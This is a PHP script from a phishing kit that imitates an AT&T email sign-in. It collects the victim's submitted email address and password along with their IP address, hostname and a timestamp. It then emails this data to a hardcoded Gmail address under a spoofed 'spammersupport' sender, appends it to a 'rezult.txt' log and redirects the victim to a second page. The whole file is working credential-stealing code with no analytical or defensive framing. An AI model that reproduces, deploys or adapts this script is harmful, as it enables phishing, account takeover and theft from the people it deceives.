<?php   ob_start();  ?>
<?
include "v-V-v.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------- AT&&T Details  ---------------\n";
$message .= "|Email Address  : ".$_POST['userid']."\n";
$message .= "|Email Password : ".$_POST['password']."\n";
$message .= "--------xX CREATED BY AQUILA Xx--------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | MR.AQUILA: ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "--------------------------------------------------\n";

$send="curmichael91@gmail.com";
$subject = "SMTP | ".$_POST['username']." | $ip";
$headers = "From: aq+uila<noreply@spammersupport.info>";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("../rezult.txt","a");
fputs($fp,$message);
fclose($fp);
@header("Location: index2.html");

	 
?>